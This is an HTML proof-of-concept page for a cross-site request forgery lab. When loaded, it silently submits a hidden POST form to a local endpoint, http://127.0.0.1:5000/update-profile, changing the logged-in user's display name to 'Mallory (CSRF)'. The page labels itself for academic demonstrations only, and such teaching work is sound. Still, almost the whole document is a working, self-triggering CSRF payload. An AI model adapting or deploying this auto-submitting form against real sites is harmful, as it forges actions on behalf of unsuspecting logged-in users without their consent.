<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CSRF PoC (Local Lab)</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: "Segoe UI", Tahoma, sans-serif;
      background: linear-gradient(130deg, #f2f4f8, #dbe4f3);
      color: #1f2937;
    }

    .card {
      width: min(620px, 92%);
      background: #ffffff;
      border: 1px solid #d1d5db;
      border-radius: 14px;
      padding: 22px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
    }

    h1 {
      margin: 0 0 8px;
      font-size: 1.3rem;
    }

    p {
      margin: 0 0 10px;
      line-height: 1.45;
      font-size: 0.96rem;
    }

    .msg {
      margin-top: 12px;
      padding: 10px 12px;
      border-left: 4px solid #0f766e;
      background: #ecfeff;
      font-weight: 600;
    }

    .small {
      color: #4b5563;
      font-size: 0.88rem;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <main class="card">
    <h1>CSRF Demonstration Page</h1>
    <p>This page auto-submits a hidden form to the vulnerable local lab endpoint.</p>
    <p>Use only for controlled, academic CSRF demonstrations.</p>

    <form id="csrf-form" action="http://127.0.0.1:5000/update-profile" method="POST" style="display:none;">
      <input type="hidden" name="display_name" value="Mallory (CSRF)" />
    </form>

    <div class="msg">If you are logged in, your profile has been updated.</div>
    <p class="small">The request is submitted automatically when this page loads.</p>
  </main>

  <script>
    window.addEventListener("load", function () {
      document.getElementById("csrf-form").submit();
    });
  </script>
</body>
</html>
